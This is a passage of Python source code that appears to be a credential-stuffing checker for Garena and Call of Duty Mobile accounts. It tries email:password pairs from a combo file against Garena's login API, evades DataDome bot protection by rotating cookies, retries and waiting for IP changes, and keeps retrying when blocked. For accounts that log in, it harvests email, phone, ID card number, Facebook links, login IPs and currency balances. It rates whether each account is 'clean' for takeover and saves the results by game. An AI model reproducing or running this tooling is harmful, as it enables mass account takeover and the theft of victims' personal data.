        headers = {'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'}
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {'codm_nickname': user_data.get('codm_nickname', 'N/A'), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'), 'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'), 'email_verified': bool(user_info.get('email_v', 0)), 'email_verified_time': user_info.get('email_verified_time', 0), 'email_verify_available': bool(user_info.get('email_verify_available', False)), 'security': {'password_strength': user_info.get('password_s', 'N/A'), 'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)), 'authenticator_app': bool(user_info.get('authenticator_enable', 0)), 'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)), 'facebook_account': user_info.get('fb_account', None), 'suspicious': bool(user_info.get('suspicious', False))}, 'personal': {'real_name': user_info.get('realname', 'N/A'), 'id_card': user_info.get('idcard', 'N/A'), 'id_card_length': user_info.get('idcard_length', 'N/A'), 'country': user_info.get('acc_country', 'N/A'), 'country_code': user_info.get('country_code', 'N/A'), 'mobile_no': user_info.get('mobile_no', 'N/A'), 'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound', 'extra_data': user_info.get('realinfo_extra_data', {})}, 'profile': {'avatar': user_info.get('avatar', 'N/A'), 'signature': user_info.get('signature', 'N/A'), 'shell_balance': user_info.get('shell', 0)}, 'status': {'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive', 'whitelistable': bool(user_info.get('whitelistable', False)), 'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))}, 'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid}, 'binds': [], 'game_info': []}
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    from rich.table import Table
    from rich.panel import Panel
    from rich.box import ROUNDED, HEAVY
    from rich.console import Console
    from rich.text import Text
    from rich import box
    
    console = Console()
    
    if details is None:
        table = Table(show_header=False, box=ROUNDED, border_style="red", padding=(0, 2), expand=False)
        table.add_column(style="dim", width=12)
        table.add_column(style="bright_white")
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Reason", f"[red]{error_reason or 'Incorrect Password'}[/red]")
        console.print(Panel(table, title="[red]✖ INVALID[/red]", border_style="red", box=HEAVY, padding=(0, 1)))
        return
    
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    username = details.get('username', 'N/A')
    mobile = details['personal'].get('mobile_no', 'N/A')
    country_code = details['personal'].get('country_code', 'N/A')
    shell = details['profile'].get('shell_balance', 0)
    is_clean = details.get('is_clean', False)
    formatted_mobile = format_mobile_number(mobile, country_code)
    
    if email and email != 'N/A' and ('@' in email):
        email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
    else:
        email_display = 'N/A'
    
    fb_username = details['facebook']['fb_username']
    fb_uid = details['facebook']['fb_uid']
    fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
    
    if fb_uid == 'N/A' or not fb_uid:
        fb_info = 'NOT CONNECTED'
        fb_username = 'N/A'
        fb_link = 'N/A'
    elif not fb_username or fb_username == 'N/A':
        fb_info = 'FB UNBIND or FB DELETED'
        fb_username = 'N/A'
    else:
        fb_info = 'CONNECTED'
    
    login_history = details.get('login_history', [])
    last_login_info = login_history[0] if login_history else {}
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
    last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
    last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
    last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
    
    other_games = [g for g in game_connections or [] if g.get('game', '').upper() != 'CODM']
    shell_color = "yellow" if int(shell or 0) > 0 else "dim"
    
    if has_codm and codm_info:
        border_color = "green" if is_clean else "yellow"
        title = f"[bold {border_color}]✨ CLEAN[/bold {border_color}]" if is_clean else f"[bold {border_color}]⊘ NOT CLEAN[/bold {border_color}]"
        
        table = Table(show_header=False, box=ROUNDED, border_style=border_color, padding=(0, 2), expand=False)
        table.add_column(style="dim", width=14)
        table.add_column(style="bright_white")
        
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Username", username)
        table.add_row("Shell", f"[{shell_color}]{shell}[/{shell_color}]")
        table.add_row("Email", email_display)
        table.add_row("Mobile", str(formatted_mobile))
        table.add_row("Facebook", fb_info)
        
        table.add_row("", "")
        table.add_row("CODM Level", f"[cyan]{codm_info.get('codm_level', 'N/A')}[/cyan]")
        table.add_row("Server", f"[cyan]{codm_info.get('region', 'N/A')}[/cyan]")
        table.add_row("IGN", f"[cyan]{codm_info.get('codm_nickname', 'N/A')}[/cyan]")
        table.add_row("CODM UID", f"[cyan]{codm_info.get('uid', 'N/A')}[/cyan]")
        
        table.add_row("", "")
        table.add_row("Last Login", f"[dim]{last_login_date}[/dim]")
        table.add_row("Login From", f"[dim]{last_login_where}[/dim]")
        table.add_row("Login IP", f"[dim]{last_login_ip}[/dim]")
        table.add_row("Country", f"[dim]{last_login_country}[/dim]")
        
        if other_games:
            table.add_row("", "")
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                table.add_row(f"{gname} [{greg}]" if greg else gname, f"[magenta]{grole}[/magenta]")
        
        table.add_row("", "")
        table.add_row("Status", f"[bold {border_color}]{'Clean' if is_clean else 'Not Clean'}[/bold {border_color}]")
        
        console.print(Panel(table, title=title, border_style=border_color, box=HEAVY, padding=(0, 1)))
    
    else:
        border_color = "magenta" if other_games else "cyan"
        gnames = ' / '.join((g.get('game', '?') for g in other_games)) if other_games else ''
        title = f"[bold {border_color}]◆ NO CODM ({gnames})[/bold {border_color}]" if other_games else f"[bold {border_color}]○ NO CODM[/bold {border_color}]"
        
        table = Table(show_header=False, box=ROUNDED, border_style=border_color, padding=(0, 2), expand=False)
        table.add_column(style="dim", width=14)
        table.add_column(style="bright_white")
        
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Username", username)
        table.add_row("Shell", f"[{shell_color}]{shell}[/{shell_color}]")
        table.add_row("Email", email_display)
        table.add_row("Mobile", str(formatted_mobile))
        table.add_row("Facebook", fb_info)
        
        table.add_row("", "")
        table.add_row("CODM", "[red]NO CODM ACCOUNT[/red]")
        
        table.add_row("", "")
        table.add_row("Last Login", f"[dim]{last_login_date}[/dim]")
        table.add_row("Login From", f"[dim]{last_login_where}[/dim]")
        table.add_row("Login IP", f"[dim]{last_login_ip}[/dim]")
        table.add_row("Country", f"[dim]{last_login_country}[/dim]")
        
        if other_games:
            table.add_row("", "")
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                table.add_row(f"{gname} [{greg}]" if greg else gname, f"[magenta]{grole}[/magenta]")
        
        table.add_row("", "")
        table.add_row("Status", f"[bold {border_color}]{'Clean' if is_clean else 'Not Clean'}[/bold {border_color}]")
        
        console.print(Panel(table, title=title, border_style=border_color, box=HEAVY, padding=(0, 1)))

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections)
_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS', 
               '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV', 
               '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE',
               '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS',
               '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE',
                    '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS',
                    '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
                        'Pragma': 'no-cache', 'Accept': '*/*', 
                        'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
                       'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, 
                                       json={'token': access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
                         'Accept': 'application/json, text/plain, */*', 
                         'Referer': f'https://{base_domain}/?app={app_id}', 
                         'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id}, 
                                        headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({
                    'region': region.upper(), 
                    'game': game_name, 
                    'role': str(role),
                    'app_id': app_id
                })
    except Exception as e:
        logger.error(f'[ERROR] get_game_connections failed: {e}')
    return game_info

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        logger.error(f'[ERROR] save_game_folder: {e}')

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
    max_retries = 15
    attempt = 0
    
    def _display(acc, pwd, det, codm, has, err=None, gc=None):
        if not suppress_print:
            (display_codm_info_elegant if use_elegant_display else display_codm_info)(acc, pwd, det, codm, has, err, gc)
    
    while True:
        attempt += 1
        try:
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)
            
            dd = datadome_manager.get_datadome()
            if dd:
                datadome_manager.set_session_datadome(session, dd)
            else:
                saved = cookie_manager.get_valid_cookies()
                if saved:
                    picked = random.choice(saved)
                    val = picked.split('=', 1)[1] if '=' in picked else picked
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    ndd = get_datadome_cookie(session, proxies=proxy_dict)
                    if ndd:
                        datadome_manager.set_datadome(ndd)
                        datadome_manager.set_session_datadome(session, ndd)
            
            v1, v2, new_dd = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
            
            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = requests.Session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return 'IP_CHANGED'
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if not v1 or not v2:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                _display(account, password, None, None, False, err="Account Doesn't Exist!")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if new_dd:
                datadome_manager.set_datadome(new_dd)
                datadome_manager.set_session_datadome(session, new_dd)
            
            sso_key = login(session, account, password, v1, v2)
            
            if not sso_key:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err=reason)
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                return 'ERROR'
            
            cookie_parts = [f'{k}={session.cookies.get(k)}' for k in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'] if session.cookies.get(k)]
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if datadome_manager.handle_403(session):
                    if attempt < max_retries:
                        if not suppress_print:
                            print(f'  {_YL}⚠  403 error, retrying ({attempt}/{max_retries}){_RST}')
                        continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {_YL}⚠  Invalid response, retrying ({attempt}/{max_retries}){_RST}')
                    time.sleep(2)
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if 'error_auth' in account_data_json:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    live_stats.update_stats(valid=False)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err="Account Doesn't Exist!")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
                else:
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    live_stats.update_stats(is_error=True)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
            
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            
            codm_session = requests.Session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
            
            has_codm, codm_info = check_codm_account(codm_session, account)
            codm_session.close()
            
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    if not suppress_print:
                        console.print(f'  [dim]🔄 Checking game connections for {account}...[/dim]')
                    game_connections = get_game_connections(session, account)
                    if game_connections:
                        if not suppress_print:
                            console.print(f'  [dim]✓ Found {len(game_connections)} game connection(s)[/dim]')
                            for g in game_connections:
                                console.print(f'  [dim]  • {g.get("game")}: {g.get("role")} ({g.get("region")})[/dim]')
                    else:
                        if not suppress_print:
                            console.print(f'  [dim]✗ No game connections found[/dim]')
                except Exception as _ge:
                    if not suppress_print:
                        console.print(f'  [yellow]⚠ Game check error: {_ge}[/yellow]')
                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')
            
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
            else:
                email_display = 'N/A'
            
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
            
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            
            shell_balance = details['profile'].get('shell_balance', 0)
            
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': shell_balance,
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'game_connections': game_connections
            }
            
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            
            results_manager.add_account(account_data)
            
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(
                valid=True,
                clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                game_connections=game_connections,
                shell=shell_balance
            )
            live_stats.push_result(
                success=True,
                is_clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                shell_balance=shell_balance
            )
            
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            
            _display(account, password, details, codm_info, has_codm, gc=game_connections)
            
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
            
            return 'DONE'
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < max_retries:
                if not suppress_print:
                    print(f'  {_YL}⚠  Connection/Timeout error, retrying ({attempt}/{max_retries}){_RST}')
                time.sleep(3)
                continue
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR'
            
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            logger.error(f'[ERROR] Unexpected error processing {account}')
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR'

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    
    for attempt in range(max_retries):
        try:
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            
            current_cookies = session.cookies.get_dict()
            
            cookie_parts = []
            for name in ['apple_state_key', 'datadome', 'sso_key']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_parts:
                headers['cookie'] = '; '.join(cookie_parts)
            
            resp = session.get(url, headers=headers, params=params, timeout=10)
            
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                session.cookies.set('datadome', new_dd, domain='.garena.com')
                datadome_manager.set_datadome(new_dd)
            
            if resp.status_code == 403:
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    time.sleep(0.3)
                    continue
                else:
                    return (None, None, None)
            
            if resp.status_code != 200:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                continue
            
            resp.raise_for_status()
            
            try:
                data = resp.json()
            except json.JSONDecodeError:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                continue
            
            if 'error' in data:
                return (None, None, None)
            
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                continue
            
            return (v1, v2, new_dd)
            
        except requests.exceptions.Timeout:
